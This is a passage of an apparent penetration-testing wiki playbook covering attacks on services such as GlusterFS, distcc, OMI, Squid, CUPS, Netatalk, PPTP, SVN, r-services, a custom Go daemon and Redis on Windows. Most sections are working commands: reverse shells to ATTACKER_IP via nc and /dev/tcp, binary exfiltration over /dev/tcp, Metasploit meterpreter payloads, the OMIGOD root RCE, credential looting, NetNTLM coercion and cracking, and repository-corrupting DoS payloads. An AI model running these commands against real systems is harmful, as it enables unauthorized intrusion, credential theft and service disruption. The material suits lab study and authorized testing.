#   ProxyPass / ajp://<IP>:8009/            (add secret=<AJP_SECRET> for modern Tomcat)
# then browse http://127.0.0.1/manager/html and continue in the Tomcat playbook

# Even when 8009 is not exposed: HTTP->AJP desync through mod_proxy_ajp can smuggle a
# trusted AJP request. Test Apache httpd -> Tomcat stacks for CL/TE desync (see [[http-request-smuggling]]).
```
Request attributes to abuse when the app trusts proxy data: `REMOTE_USER`, `javax.servlet.request.X509Certificate`, `AJP_SSL_PROTOCOL`. Modern Tomcat 403s unknown attrs unless they match `allowedRequestAttributesPattern`, so a permissive regex is a finding.

### Notable CVEs
- CVE-2020-1938 (Ghostcat): Tomcat AJP connector allows reading/including arbitrary files under the webroot (e.g. `WEB-INF/web.xml`) and, if file upload exists, RCE. Patched at Tomcat 9.0.31 / 8.5.51 / 7.0.100, which also require an AJP secret and bind loopback by default.

---

## GlusterFS unauthenticated volume mount and shared-storage root RCE (port 24007)

GlusterFS pools storage from many servers into one namespace. The management daemon `glusterd` listens on 24007/tcp; data bricks start at 49152/tcp (legacy clusters use 24008-24009). Default installs answer peer/volume RPC without authentication, letting an attacker enumerate and mount volumes, and the world-readable `gluster_shared_storage` volume holds root-run cron/hook templates that give cluster-wide RCE as root.

### Enumeration
```bash
sudo apt install -y glusterfs-cli glusterfs-client
nmap -sV -p 24007,49152 <IP>
# Peer + volume recon (no auth in default setups)
gluster --remote-host <IP> peer status
gluster --remote-host <IP> volume info all
gluster --version                                   # check per node; mixed versions common
```

### Exploitation / Attacks
```bash
# Mount an exported volume anonymously and loot it
sudo mount -t glusterfs <IP>:/<vol_name> /mnt/gluster
# blockers seen in /var/log/glusterfs/<vol>-*.log: TLS (transport.socket.ssl on) or
# auth.allow CIDR ACL. If TLS-enforced, steal glusterfs.pem/.key/.ca from an authorized
# client and drop them in /etc/ssl/ to satisfy mutual auth.

# Root RCE via the shared-storage hook directory (CVE-2023-3775 lets any client mount it)
sudo mount -t glusterfs <IP>:/gluster_shared_storage /tmp/gss
cat > /tmp/gss/hooks/1/start/post/test.sh <<'EOF'
#!/bin/bash
nc -e /bin/bash ATTACKER_IP 4444 &
EOF
chmod +x /tmp/gss/hooks/1/start/post/test.sh
# glusterd syncs the hook cluster-wide and runs it as root. If hooks/1/ is absent, try /ss_bricks/.
```

### Notable CVEs
- CVE-2023-3775: incorrect permission validation lets any unauthenticated client mount the admin `gluster_shared_storage` volume, enabling the hook-based root RCE above. Affects < 10.5 / 11.1.
- CVE-2022-48340: use-after-free in `dht_setxattr_mds_cbk` reachable over the network; remote DoS and probable RCE. Affects 10.0-10.4, 11.0; fixed 10.4.1 / 11.1.
- CVE-2023-26253: out-of-bounds read in the FUSE notify handler; remote crash of `glusterfsd` via a malformed NOTIFY_REPLY XDR frame to 24007 (public PoC). Affects < 11.0.

---

## distcc daemon unauthenticated command execution (port 3632)

distccd distributes compilation jobs across networked machines. The daemon on 3632/tcp historically executed attacker-supplied compiler commands with no authentication, so a reachable distccd is a direct pre-auth RCE (the classic Metasploitable foothold).

### Enumeration
```bash
nmap -p 3632 <IP>                                   # 3632/tcp open distccd
```

### Exploitation / Attacks
```bash
# CVE-2004-2687: execute arbitrary commands as the distccd user
nmap -p 3632 <IP> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
msfconsole -qx "use exploit/unix/misc/distcc_exec; set RHOSTS <IP>; \
  set PAYLOAD cmd/unix/reverse; set LHOST <ATTACKER>; run; exit"
```

### Notable CVEs
- CVE-2004-2687: distcc 2.x daemon (any version configured to accept jobs from untrusted networks) executes commands passed by clients with no access control, yielding remote code execution as the daemon user. No patched version bump fixes the design; mitigate by binding to trusted hosts only (`--allow`).

---

## OMI / OMIGOD unauthenticated root RCE on Azure Linux (ports 5985/5986)

OMI is Microsoft's open-source remote management agent (`omiengine`) auto-installed on Azure Linux VMs using Azure Automation, Log Analytics, Configuration Management, Diagnostics, etc. It runs as root listening on all interfaces (5985 http, 5986 https). A missing-auth flaw lets an unauthenticated attacker run commands as root via a single SOAP request to `/wsman`.

### Enumeration
```bash
nmap -sV -p 5985,5986 <IP>
curl -s -k https://<IP>:5986/wsman -H "Content-Type: application/soap+xml;charset=UTF-8" -d @- <<'EOF'
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body/></s:Envelope>
EOF
```

### Exploitation / Attacks
```bash
# CVE-2021-38647 (OMIGOD): send ExecuteShellCommand with NO Authentication header -> root
curl -s -k --header "Content-Type: application/soap+xml;charset=UTF-8" \
  --data-binary @exploit.xml https://<IP>:5986/wsman
# exploit.xml body runs a command as root:
#   <p:ExecuteShellCommand_INPUT
#      xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
#     <p:command>id</p:command><p:timeout>0</p:timeout></p:ExecuteShellCommand_INPUT>
git clone https://github.com/horizon3ai/CVE-2021-38647    # working PoC
```

### Notable CVEs
- CVE-2021-38647 (OMIGOD, CVSS 9.8): OMI server accepts `/wsman` SOAP messages with no Authentication header and incorrectly authorizes the client; `ExecuteShellCommand` runs as root. Affects OMI < 1.6.8.1 on Azure Linux VMs (many enabled the vulnerable agent implicitly). Fix: update OMI to 1.6.8.1+.

---

## Squid proxy abuse for internal port scan and SSRF pivot (port 3128)

Squid is a caching forward HTTP proxy on 3128/tcp. A misconfigured or open Squid becomes a pivot: relay traffic out (open proxy) or, more usefully, reach RFC1918/loopback services and cloud metadata that are otherwise unreachable, turning the proxy into an SSRF and internal-scan gateway. Cross-ref [[wiki/payloads/ssrf]] and [[pivoting-tunneling]].

### Enumeration
```bash
nmap -Pn -sV -p 3128 --script http-open-proxy <IP>
squidclient -h <IP> -p 3128 mgr:info                 # Cache Manager if squidclient present
# Confirm egress + learn the proxy's public IP
curl -x http://<IP>:3128 https://ifconfig.me -I
curl -x http://<IP>:3128 http://example.com -v        # 407 = auth required
curl -x http://user:pass@<IP>:3128 http://example.com -v
# Cache Manager info leak (version, ACLs, peers, sometimes full config)
curl http://<IP>:3128/squid-internal-mgr/menu
curl http://<IP>:3128/squid-internal-mgr/config       # full running config if ACL weak
curl -u any:PASSWORD http://<IP>:3128/squid-internal-mgr/config
```

### Exploitation / Attacks
```bash
# SSRF: reach loopback / internal / cloud metadata through the proxy
curl -x http://<IP>:3128 http://127.0.0.1:8080/ -v
curl -x http://<IP>:3128 http://169.254.169.254/latest/meta-data/ -v   # cloud IMDS
# CONNECT tunnel to a normally unreachable internal TLS service
openssl s_client -proxy <IP>:3128 -connect 10.10.10.20:8443 -quiet

# Internal port scan "from" the proxy (SPOSE), or full pivot via proxychains
python spose.py --proxy http://<IP>:3128 --target <IP>
# proxychains: append `http <IP> 3128` (add `username password` if auth) to proxychains.conf
proxychains nmap -sT -n -p- localhost
proxychains curl http://127.0.0.1:9191 -v
# Chain Browser -> Burp -> Squid (Burp upstream proxy) to intercept internal-only web UIs
```

### Notable CVEs
No single pivotal CVE; the attack value is misconfiguration (open proxy, exposed `/squid-internal-mgr/`, weak `Safe_ports`/`SSL_ports`/`to_localhost` ACLs turning CONNECT into an arbitrary TCP tunnel). On outdated builds also test request-smuggling / lenient chunked-decoding / cache-poisoning bugs (Squid has a long advisory history, e.g. the 2023 "55 vulnerabilities / 35 0days" audit).

## CUPS / IPP unauthenticated RCE chain (port 631)

The Internet Printing Protocol rides on HTTP/1.1 over **631/tcp** (jobs, queue mgmt) with **631/udp** used by `cups-browsed` for zeroconf printer discovery. On any Linux/Unix box running CUPS the discovery daemon is the marquee target: it trusts attacker-supplied printer advertisements and fetches a remote PPD whose `FoomaticRIPCommandLine` runs a shell command on the next print job. Chain is pre-auth, network access to UDP/631 is enough. Also usable as a DDoS amplifier.

### Enumeration
```bash
# Is CUPS/IPP up and what model/queues (631/tcp)
nmap -sV -p631 --script "cups-info,cups-queue-info" <target>

# KEY question: is cups-browsed listening on 631/UDP (the vuln surface)?
nmap -sU -p631 <target>
sudo ss -ulpn | grep 631            # local check: cups-browsed bound to udp/631

# CUPS discovery + attribute pull with the bundled IPP tools
ippfind --timeout 3 --txt -v "@local and port=631"     # multicast/UDP discovery
ipptool -tv ipp://<IP>/ipp/print get-printer-attributes.test   # firmware, formats

# Raw Get-Printer-Attributes over HTTP
curl -s http://<IP>:631/ipp/print -H "Content-Type: application/ipp" --data-binary @getattr.ipp
curl -s http://<IP>:631/printers/   # CUPS web UI / queue listing

# Internet-wide exposure (70k+ CUPS hosts seen 2025)
shodan search 'product:"CUPS (IPP)" port:631'
```

### Exploitation / Attacks
```bash
# cups-browsed RCE chain (CVE-2024-47076/47175/47176/47177)
# 1. Stand up a fake IPP printer that serves a malicious PPD whose
#    *FoomaticRIPCommandLine "<cmd>"  runs on job processing.
#    PoC framework (evilcups) automates the fake printer + PPD:
git clone https://github.com/evilsocket/evil-cups   # or RCESandwich PoC
python3 evilcups.py <ATTACKER_IP> <TARGET_IP> "<cmd, e.g. touch /tmp/pwn>"

# 2. Send a spoofed IPP "printer available" packet to the target's udp/631
#    pointing cups-browsed at http://ATTACKER:PORT/printers/evil (CVE-2024-47176).
#    cups-browsed auto-creates the printer and fetches your PPD without validation
#    (CVE-2024-47076 / 47175).
# 3. Trigger: command fires when a job is sent to the attacker-added queue
#    (CVE-2024-47177 via foomatic-rip). Some setups a user must print;
#    others auto-process. Wait for/print a job to detonate.
lp -d <evil-queue-name> /etc/hostname

# DDoS amplification angle: a single spoofed UDP/631 discovery packet makes each
# CUPS host issue an outbound IPP request to a victim -> reflection/amplification.

# cupsd symlink Listen abuse (CVE-2024-35235): root cupsd chmod 666's an
# attacker-chosen path via a symlink in cupsd.conf Listen -> writable system
# file -> local privesc, then RCE via a PPD with FoomaticRIPCommandLine.

# Classic printer abuse (non-CUPS office devices)
# - Unauth POST /ipp/print often accepted; malicious PostScript can call system()
# - Job hijacking: Cancel-Job then Send-Document swaps someone's document
# - SNMP default community 'public' leaks the queue name needed in the IPP URL
```

### Notable CVEs
- **CVE-2024-47176** (cups-browsed): binds udp/631 and trusts any `Get-Printer-Attributes` IPP URL in a discovery packet. Entry point of the chain.
- **CVE-2024-47076** (libcupsfilters): attacker-controlled IPP attributes from the fetched PPD are not sanitized into the system.
- **CVE-2024-47175** (libppd): unsanitized IPP attributes written into the generated PPD, enabling injection of `FoomaticRIPCommandLine`.
- **CVE-2024-47177** (cups-filters / foomatic-rip): `FoomaticRIPCommandLine` in the PPD executes arbitrary commands on print. Ensure **cups-filters >= 2.0.0**.
- **CVE-2024-35235** (cupsd <= 2.4.8): symlink `Listen` -> arbitrary chmod 666 -> local privesc.
- **CVE-2023-50739** (Lexmark IPP parser): heap overflow -> RCE over LAN/Wi-Fi.
- **CVE-2023-0856** (Canon, Pwn2Own): stack overflow in the `sides` attribute -> RCE.
- Mitigation: `systemctl stop/disable cups-browsed`; firewall udp/631; enforce ipps:// (TLS) + auth.

---

## AFP (Netatalk) unauthenticated NAS RCE (port 548)

Apple Filing Protocol over TCP/DSI on **548/tcp**. Largely replaced by SMB on modern macOS but very much alive on NAS appliances (QNAP, Synology, WD, TrueNAS) via the open-source **Netatalk** daemon, where a string of pre-auth memory-corruption bugs yields **remote root**. Fingerprint output (`Machine Type: Netatalk`, exposed UAMs) tells you which login parser is reachable before you pick an exploit.

### Enumeration
```bash
# Banner + version + non-DoS NSE scripts
nmap -p 548 -sV --script "afp-* and not dos" <IP>

# Metasploit server info (name, machine type, AFP version, UAMs)
msfconsole -qx "use auxiliary/scanner/afp/afp_server_info; set RHOSTS <IP>; run; exit"

# With creds: enumerate volumes, ACLs, files
nmap -p 548 --script afp-serverinfo,afp-showmount,afp-ls \
  --script-args 'afp.username=<USER>,afp.password=<PASS>,ls.maxdepth=2,ls.maxfiles=50' <IP>

# Brute force (NSE or hydra)
nmap -p 548 --script afp-brute <IP>
hydra -L users.txt -P passwords.txt afp://<IP>

# Mount a share (Linux, afpfs-ng) then hunt AppleDouble ._* metadata
apt install afpfs-ng
mkdir /mnt/afp && mount_afp afp://USER:PASS@<IP>/SHARE /mnt/afp
```
Watch the `afp-serverinfo` output: `Machine Type: Netatalk` = Unix/NAS not Apple; UAMs like `Cleartxt`/`Guest`/`DHX` reveal weak/legacy login paths; `afp-showmount` ACLs expose drop-box shares holding backups and `.appl` files.

### Exploitation / Attacks
```bash
# parse_entries() pre-auth RCE, Netatalk <= 3.1.12 (CVE-2022-23121, CVSS 9.8)
# Malicious AppleDouble header -> remote ROOT before auth. Delivered via DSI WRITE.
msfconsole -qx "use exploit/linux/netatalk/parse_entries; \
  set RHOSTS <IP>; set TARGET 0; \
  set PAYLOAD linux/x64/meterpreter_reverse_tcp; run; exit"

# DSI OpenSession OOB write, Netatalk 3.0.0-3.1.11 (CVE-2018-1160)
# Unauthenticated code execution; Tenable published analysis + PoC.

# CVE-2022-45188: crafted .appl -> heap overflow in afp_getappl.
#   Relevant when you can WRITE files into a share and FCE/notify is on.
# UAM-gated one-byte OOB writes (fixed 2.4.1/3.1.19/3.2.1):
#   CVE-2024-38439 reachable via uams_clrtxt.so (ClearTxt FPLoginExt)
#   CVE-2024-38440 reachable via uams_dhx.so   (DHX login)
#   CVE-2024-38441 reachable via uams_guest.so (Guest login)
# -> use the exposed-UAM list to choose the reachable parser.
```

### Notable CVEs
- **CVE-2022-23121** Netatalk <=3.1.12 `parse_entries()` pre-auth RCE (root), CVSS 9.8.
- **CVE-2018-1160** Netatalk 3.0.0-3.1.11 DSI OpenSession OOB write, unauth RCE.
- **CVE-2022-45188** `afp_getappl` heap overflow via crafted `.appl` (write access).
- **CVE-2023-42464** Spotlight RPC type confusion (needs `spotlight = yes`).
- **CVE-2024-38439/38440/38441** UAM-dependent one-byte heap OOB writes.
- **CVE-2022-22995** AppleDouble v2 symlink redirection -> arbitrary write/RCE (3.1.0-3.1.17).
- **CVE-2010-0533** Mac OS X 10.6 AFP directory traversal (detected by `afp-path-vuln.nse`).

---

## PPTP VPN handshake capture -> offline NT-hash recovery (port 1723)

Point-to-Point Tunneling Protocol: control channel on **1723/tcp**, PPP payload carried in **GRE (IP proto 47)**, auth almost always **MS-CHAPv2**. The value is not the control connection; it is that a sniffed MS-CHAPv2 handshake collapses to DES-derived material, so passive capture enables offline password / NT-hash recovery. Note a host can answer on 1723/tcp while the tunnel still fails because GRE is filtered.

### Enumeration
```bash
nmap -Pn -sSV -p1723 <IP>
nmap -Pn -sO --protocol 47 <IP>       # confirm GRE reachability, not just tcp/1723

# Capture BOTH control + encapsulated PPP for the handshake
sudo tcpdump -ni <iface> 'tcp port 1723 or gre' -w pptp-handshake.pcap
tshark -r pptp-handshake.pcap -Y 'pptp || gre || ppp || chap'
```

### Exploitation / Attacks
```bash
# 1. Parse the capture and pull the MS-CHAPv2 material
chapcrack.py parse -i pptp-handshake.pcap
tshark -r pptp-handshake.pcap -Y 'ppp and chap'
# Fields needed (RFC 2759): username, peer-challenge, authenticator-challenge, NT-Response

# 2a. Crack with hashcat as NetNTLMv1/ESS (mode 5500)
#     line: <user>::<domain_or_blank>:<peer_challenge>:<nt_response>:<authenticator_challenge>
hashcat -m 5500 -a 0 mschapv2.hashes /usr/share/wordlists/rockyou.txt

# 2b. Or crack challenge/response directly with asleap
asleap -C <8-byte-challenge> -R <24-byte-response> -W /usr/share/wordlists/rockyou.txt

# 3. NT-hash-first (skip password cracking) with a prepared NT-hash DB
./assless-chaps <challenge> <response> <hashes.db>

# 4. With recovered secret, decrypt the session and analyze post-auth traffic
chapcrack.py decrypt -i pptp-handshake.pcap -o pptp-decrypted.pcap -n <recovered_nt_hash>
```
The recovered NT hash is valuable by itself: validate the crack, decrypt captures, and pivot into Windows credential-reuse checks. Even unrecovered, store the handshake and attack it offline later.

### Notable CVEs
No single CVE; the weakness is protocol-level. MS-CHAPv2 security effectively reduces to recovering DES-derived / NT-hash-equivalent secrets from a passive capture (Marlinspike/moxie0, 2012), which is why PPTP is deprecated. GRE-dependent data channel also causes silent tunnel failures behind firewalls.

---

## SVN svnserve source/credential leak + repo DoS (port 3690)

Subversion centralized VCS. Native protocol on **3690/tcp** (svnserve); also served over HTTP(S) via `mod_dav_svn` and over `svn+ssh://`. Attack value is anonymous/weak-auth read of repositories that version build pipelines, deploy keys, and DB credentials, plus history mining.

### Enumeration
```bash
nc -vn <IP> 3690                                   # banner grab
svn ls svn://<IP>                                  # anonymous root listing
svn ls -R svn://<IP>/repo                           # recursive
svn info svn://<IP>/repo                             # metadata
svn log  svn://<IP>/repo                             # commit history
svn propget --revprop -r HEAD svn:log svn://<IP>/repo  # revprops (build creds/URLs/tokens)

# Over HTTP(S) with mod_dav_svn (version leaks in response headers)
svn ls https://<IP>/svn/repo --username guest --password ''

# No lockout by default -> quick credential spray
hydra -L users.txt -P passwords.txt svn://<IP>     # or the bash loop over svn ls
```

### Exploitation / Attacks
```bash
# 1. anon-access = read (or write) in svnserve.conf -> dump the repo
svn checkout svn://<IP>/repo && cd repo
grep -RniE "password|secret|token|api[_-]?key" .    # mine checked-out source

# 2. Hooks + externals often hold plaintext creds / extra hosts
#    (after checkout)
cat hooks/pre-commit hooks/post-commit 2>/dev/null
svn propget svn:externals -R .                      # pull additional/other-host paths

# 3. svn+ssh restricted shells: try to smuggle subcommands past the wrapper
ssh user@<IP> svnserve -t

# 4. Filesystem access to the repo -> offline analysis, no creds
svnadmin dump /path/repo ; svnlook author /path/repo ; svnlook dirs-changed /path/repo

# CVE-2024-46901 DoS (needs commit rights): control char in a path corrupts the
# repo and can crash mod_dav_svn workers. Cleanup requires svnadmin dump/filter/load.
printf 'pwn' > /tmp/payload
svnmucc -m "DoS" put /tmp/payload $'http://<IP>/svn/repo/trunk/bad\x01path.txt'

# CVE-2024-45720 (Windows client): best-fit encoding of a crafted non-ASCII
# repo URL/path -> argument injection in svn.exe. Phish a Windows dev to run
# `svn status` on an attacker-named working copy/URL decoding to '" & calc.exe & "'.
```

### Notable CVEs
- **CVE-2024-46901** mod_dav_svn control-char path DoS / repo corruption, SVN <=1.14.4 over HTTP(S), fixed 1.14.5.
- **CVE-2024-45720** Windows-only `svn.exe` best-fit argument injection -> arbitrary program execution, <=1.14.3, fixed 1.14.4.

---

## r-services (rexec 512 / rlogin 513 / rsh 514)

The Berkeley r-services suite: legacy remote-command / remote-login daemons that are insecure by design and still surface on old UNIX and network appliances. **rexec (512/tcp)** authenticates with a clear-text username+password; **rlogin (513/tcp)** and **rsh (514/tcp)** use host-trust via `~/.rhosts` and `/etc/hosts.equiv`, trusting an IP+DNS pair that is trivially spoofable on the LAN. If one port is open, always check the other two, they ship from the same package. Everything is clear-text, so a packet capture recovers creds without touching the target.

### Enumeration
```bash
# All three at once
nmap -sV -p 512,513,514 <target>

# rexec: manual protocol replay (three NUL-terminated strings + command)
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
# ask the server to connect back for stderr (firewall/filter fingerprint)
nc -lvnp 4444 &
printf '4444\0user\0password\0id; uname -a\0' | nc <target> 512

# rexec username oracle: some rexecd return "Login incorrect." vs
# "Password incorrect." -> validate users before spraying passwords
printf '0\0root\0wrongpass\0id\0'            | nc -w2 <target> 512 | tail -c +2
printf '0\0definitelynotreal\0wrongpass\0id\0' | nc -w2 <target> 512 | tail -c +2

# rexec/rlogin/rsh legacy clients (inetutils / rsh-client package)
apt-get install rsh-client inetutils-rexec
```

### Exploitation / Attacks
```bash
# --- rexec: credential brute + RCE (creds required) ---
nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8   # also medusa -M REXEC / ncrack
msfconsole -qx "use auxiliary/scanner/rservices/rexec_login; set RHOSTS <target>; \
  set USER_FILE users.txt; set PASS_FILE passwords.txt; run; exit"
# rexec runs the command via /bin/sh -c, so shell-escape to a reverse shell:
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

# --- rsh / rlogin: .rhosts / hosts.equiv TRUST abuse (no password) ---
# If ATTACKER_IP (or a spoofed source) is trusted, log in / run cmds with no creds:
rlogin <target> -l root
rsh <target> id
rsh <target> -l domain\\user "cat /etc/shadow"
hydra -L users.txt rlogin://<target>   # brute where trust is not open

# Trust is IP+DNS based and spoofable on-LAN; a '+ +' in a user's ~/.rhosts
# or a permissive /etc/hosts.equiv means ANY host/user is trusted.

# --- Post-ex + lateral movement across all three ---
# Clear-text sniff -> creds straight off the wire
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
  awk -F"\\0" '{print $2":"$3" -> "$4}'
# Loot stored trust/creds for reuse on the next host
find / -xdev \( -name .netrc -o -name netrc -o -path '*/.rhosts' -o -name hosts.equiv \) 2>/dev/null
find / -name .rhosts 2>/dev/null
```

### Notable CVEs
No single marquee CVE; the whole suite is deprecated by design. Impact classes: clear-text credential sniffing (512), and `.rhosts`/`hosts.equiv` IP-spoofable trust bypass giving passwordless command execution (513/514). Replace with SSH; disable all three together (shared codebase). Mis-set `/etc/pam.d/rexec` (e.g. `pam_rootok`) can even yield a root shell.

---

## WS-Discovery device discovery + rogue responder (port 3702/UDP)

Web Services Dynamic Discovery (WSD): a SOAP-over-UDP multicast discovery protocol on **3702/udp** (IPv4 multicast `239.255.255.250`, IPv6 `ff02::c`). Ubiquitous on ONVIF cameras, printers, and Windows WSD services. Offensive value: responses leak `Types` (device class), `Scopes` (model/MAC/location metadata), and especially `XAddrs`, the follow-up management endpoint you pivot to. Also a rogue-responder and reflection/amplification vector.

### Enumeration
```bash
# Query one host / discover the whole L2 segment
nmap -sU -p 3702 --script wsdd-discover <IP>
sudo nmap --script broadcast-wsdd-discover        # multicast, local segment only

# Manual Probe when you want raw XML (also works as UNICAST for routed subnets,
# since multicast usually will not cross a router)
python3 - <<'PY'
import socket, uuid
probe=(f'<?xml version="1.0"?><e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"'
 ' xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
 ' xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"'
 ' xmlns:dn="http://www.onvif.org/ver10/network/wsdl"><e:Header>'
 f'<w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>'
 '<w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>'
 '<w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action></e:Header>'
 '<e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body></e:Envelope>').encode()
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,1); s.settimeout(3); s.bind(("0.0.0.0",0))
s.sendto(probe,("239.255.255.250",3702))          # or unicast to a known host IP
while True:
    try: d,a=s.recvfrom(65535); print(a[0], d.decode(errors="ignore"))
    except socket.timeout: break
PY

# Passive capture of Probe/ProbeMatch traffic
sudo tcpdump -ni <iface> udp port 3702
```
Filters: cameras answer `dn:NetworkVideoTransmitter`; ONVIF exposes `tds:Device` + `XAddrs` like `http://<ip>/onvif/device_service`; printers expose `wprt:PrintDeviceType`.

### Exploitation / Attacks
```bash
# 1. Pivot on XAddrs (the real target): ONVIF -> RTSP/media enum,
#    printer/WSD -> IPP/HTTP admin (the CUPS/IPP section above), Windows/WCF -> the published URI.

# 2. Rogue responder / service impersonation (flat networks):
#    answer multicast Probes faster than the real device and advertise
#    attacker-controlled XAddrs. If a mgmt platform auto-discovers and blindly
#    connects, you redirect onboarding to a fake ONVIF/SOAP endpoint and can
#    capture credentials the client auto-submits. Test: does the client trust
#    the first responder / validate endpoint identity / reuse creds?

# 3. Reflection / amplification DDoS: Internet-exposed udp/3702 lets a spoofed
#    source IP trigger larger responses from many devices (Axis advisory).
#    Internet exposure also signals bad segmentation + a weakly-hardened IoT fleet.

# 4. Scopes metadata (vendor/model/MAC/profile/location) -> prioritize password
#    spraying and firmware hunting; fast way to sort cameras vs Windows WSD vs printers.
```

### Notable CVEs
No specific CVE for the protocol; the two abuse classes are design-level: first-responder trust in auto-discovery/onboarding (rogue responder -> credential capture) and UDP reflection/amplification DDoS when 3702/udp is Internet-exposed (see the Axis ONVIF WS-Discovery DDoS advisory).

## Tools Reference

| Tool | Purpose |
|------|---------|
| [[wiki/tools/nmap]] | Port scanning, service versioning, NSE scripts (ftp-anon, smtp-open-relay, smb-protocols) |
| [[metasploit]] | Exploit delivery (EternalBlue, BlueKeep, etc.) |
| [[wiki/tools/hydra]] | Brute force — FTP, SSH, RDP, SMB, SMTP, POP3, IMAP, HTTP |
| smbclient | SMB share interaction, file download/upload |
| smbmap | SMB share enumeration with permissions |
| enum4linux-ng | Automated SMB null-session enumeration |
| CrackMapExec (CME) | SMB auth, spray, exec, hash dump, multi-host |
| impacket-psexec | SMB-based SYSTEM shell |
| impacket-ntlmrelayx | NTLM relay attacks |
| Responder | LLMNR/NBT-NS poisoning, NTLMv2 capture |
| sqlcmd / sqsh / mssqlclient.py | MSSQL interaction |
| mysql | MySQL interaction |
| dig / fierce / subfinder / subbrute | DNS enumeration and zone transfer |
| smtp-user-enum | SMTP VRFY/EXPN/RCPT user enumeration |
| swaks | SMTP testing, open relay abuse |
| o365spray | Office 365 user enum and password spray |
| snmpwalk / onesixtyone | SNMP community string brute force and MIB walk |
| crowbar | RDP password spray |
| xfreerdp | RDP client with PtH support |
| medusa | Multi-protocol brute force (FTP, SSH, SMB, etc.) |

---

## Latest Vulnerabilities Per Service

| Service | CVE | Name | Impact |
|---------|-----|------|--------|
| FTP | CVE-2022-22836 | CoreFTP path traversal | Authenticated arbitrary file write |
| SMB | CVE-2020-0796 | SMBGhost | Unauthenticated RCE (Win 10 1903/1909) |
| SMB | CVE-2017-0144 | EternalBlue | Unauthenticated RCE via SMBv1 |
| RDP | CVE-2019-0708 | BlueKeep | Unauthenticated RCE (Win 7/Server 2008) |
| SMTP | CVE-2020-7247 | OpenSMTPD RCE | Pre-auth RCE via sender field injection |
| MySQL | CVE-2012-2122 | MySQL auth bypass | Timing attack auth bypass |
| DNS | — | Subdomain takeover | Phishing, CORS abuse, cookie theft at scale |

---

## Sources

- CPTS Module 116: Attacking Common Services (HTB Academy)
- THM Skynet room — SMB null session + hydra + CMS exploitation chain
- THM Fowsniff CTF — POP3 brute force + email-based credential extraction
- THM GoldenEye — POP3 multi-stage pivot + kernel exploit
- THM IDE — vsftpd anonymous FTP + Codiad RCE + service privesc
- THM BiteMe — Fail2ban abuse for root

## Custom Go service: RE the binary for a hardcoded auth string + exec sink

A custom network daemon (often a Go `net/http` server on an odd port) that gates a "command"/
"directive" endpoint behind a code is usually reversible in minutes, do NOT brute the protocol.
The auth is frequently a plaintext string comparison and the sink a shell exec, so extracting the
string gives command execution as whatever user the service runs.

1. **Confirm the runtime + user.** `ss -ltnp` (which pid owns the port) and, if it is a systemd
   service, `systemctl cat <svc>` -> `User=`. A `User=root` service with a command sink = root RCE.
2. **Exfil the binary** (world-readable is common): `cat /path/bin > /dev/tcp/<lhost>/<port>` to an
   `nc -lvnp <port>` listener on the attack box.
3. **Disassemble the handler.** Go binaries keep symbols unless stripped/garbled:
   `GOROOT=$(ls -d /usr/local/go /usr/lib/go-* | head -1) go tool objdump -s main.main <bin>`
   (or GNU `objdump -d`). Read the handler for two calls:
   - `runtime.memequal` / `strcmp` on the auth value => the code/token is a **plaintext string in
     `.rodata`**. The `CMPQ BX, $0xN` just before it is the length; the `LEAQ 0x..(IP), BX` before
     that points at the string.
   - `os/exec.Command` / `.Output` / `.Run` => your input is **run as a shell command** (the LEAQ'd
     4-byte string is often `bash`).
4. **Read the string from `.rodata`.** Resolve the `LEAQ` target VA (`next-instr-addr + disp`), then
   map VA->file offset with the read-only LOAD segment from `readelf -lW <bin>`
   (`offset + (VA - vaddr)`), and `dd if=<bin> bs=1 skip=<fileoff> count=<len>`.
5. **Fire the sink** with the extracted code (often an HTTP header the strings/handler reveal, e.g.
   `Clearance-Code:`) + the directive -> RCE as the service's user.

Also works for non-Go daemons: `strings`/`objdump`/Ghidra to find the compared constant + the
`system()`/`exec*()` sink. A plaintext-compared secret in a binary is not a secret. See
[[binary-exploitation]].

<!-- promoted-slug: go-service-rodata-rce -->

## Redis on Windows: `dofile` read-oracle + UNC-coerce (when the full Lua escapes are patched)

The Debian `liblua`/`MODULE`/master-slave RCE paths are Linux-side. On a hardened **Windows** Redis
(e.g. 2.8.x) the Lua sandbox blocks `io`/`os`/`loadfile`/`require`, so those escapes fail - but two
weaker primitives usually survive and are enough.

**File-read oracle via `dofile`.** `dofile` is often left exposed. It tries to PARSE the target file
as Lua, fails, and echoes a fragment of the file's first line back in the parse error - a one-line
arbitrary-file read as the Redis service account:

```bash
redis-cli -h <IP> EVAL "return tostring(dofile)" 0    # function: ... = exposed (io/os/loadfile raise "unexisting global")
redis-cli -h <IP> EVAL "dofile('C:/Users/<svc>/Desktop/user.txt')" 0
#   -> ...malformed number near '<flag>'   (content leaked in the error)
```

It doubles as an **exists/permission oracle**: `Permission denied` = file present but the service
account can't read it (e.g. another user's `system.txt`); `No such file or directory` = absent. Use
it to map where the flag lives before escalating.

**Coerce SMB auth -> NetNTLMv2.** Redis runs as a real user; point its working dir at a UNC path and
force a file op, and it authenticates to your SMB listener. Capture and crack for that user's creds:

```bash
responder -I <iface> -dwv
redis-cli -h <IP> CONFIG SET dir '//<LHOST>/pub'
redis-cli -h <IP> SAVE                 # coerces the auth; Responder logs enterprise-security::DOMAIN:...
hashcat -m 5600 ntlmv2.hash rockyou.txt
```

**Write-oracle gotcha:** `CONFIG SET dir <path>` + `SAVE` returns `OK` even when the dir change was
silently rejected, so `SAVE`->OK is NOT proof a path is writable (a locked-down dir like
